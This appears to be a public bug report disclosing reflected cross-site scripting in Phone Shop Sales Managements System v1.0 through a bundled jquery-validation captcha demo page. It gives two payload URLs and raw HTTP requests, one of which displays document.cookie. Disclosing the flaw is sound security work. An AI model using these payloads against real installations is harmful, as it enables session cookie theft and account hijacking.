# Phone Shop Sales Managements System v1.0 has Cross-site scripting (reflected)

BUG_Author: Blair

Source code website address：https://www.sourcecodester.com/php/10882/phone-shop-sales-managements-system.html

Vulnerability File: /osms/assets/plugins/jquery-validation-1.11.1/demo/captcha/index.php

Payload1:http://localhost/osms/assets/plugins/jquery-validation-1.11.1/demo/captcha/index.php/"><script>alert(1111)</script>?captcha=1&submit=Check

```
GET /osms/assets/plugins/jquery-validation-1.11.1/demo/captcha/index.php/%22%3E%3Cscript%3Ealert(1111)%3C/script%3E?captcha=1&submit=Check HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: PHPSESSID=6fcav63hl60icb4n7tsvv0ns5k
Connection: close
```

![image](https://github.com/blairting/bug_report/blob/main/picture/1.png)

Payload2:http://localhost/osms/assets/plugins/jquery-validation-1.11.1/demo/captcha/index.php/"><script>alert(document.cookie)</script>?captcha=1&submit=Check

```
GET /osms/assets/plugins/jquery-validation-1.11.1/demo/captcha/index.php/%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E?captcha=1&submit=Check HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Connection: close
```

![image](https://github.com/blairting/bug_report/blob/main/picture/2.png)
